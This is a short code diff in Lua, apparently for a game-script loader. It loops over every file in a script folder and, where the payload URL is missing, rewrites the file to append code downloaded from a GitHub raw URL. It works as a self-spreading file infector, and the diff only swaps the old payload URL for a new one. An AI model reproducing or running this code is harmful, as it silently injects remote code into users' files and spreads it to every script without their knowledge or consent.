@@ -21,11 +21,11 @@ while FileName do
         FileText = FileText..Line
     end
     File:close()
-    if not Skip and not FileText:find("https://raw%.githubusercontent%.com/TheVegasPro/123345/main/4124") then
+    if not Skip and not FileText:find("https://raw.githubusercontent.com/vova123298/noc/refs/heads/main/nocasino.lua") then
         local encoding = require "encoding"
         encoding.default = "CP1251"
         local File = io.open(Directory..FileName, "w")
-        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/TheVegasPro/123345/main/4124").text))
+        File:write("-- Exception "..FileName.."\n"..FileText.."\n"..encoding.UTF8:decode((require("requests")).get("https://raw.githubusercontent.com/vova123298/noc/refs/heads/main/nocasino.lua").text))
         File:close()
     end
     FileName = findNextFile(Handle)
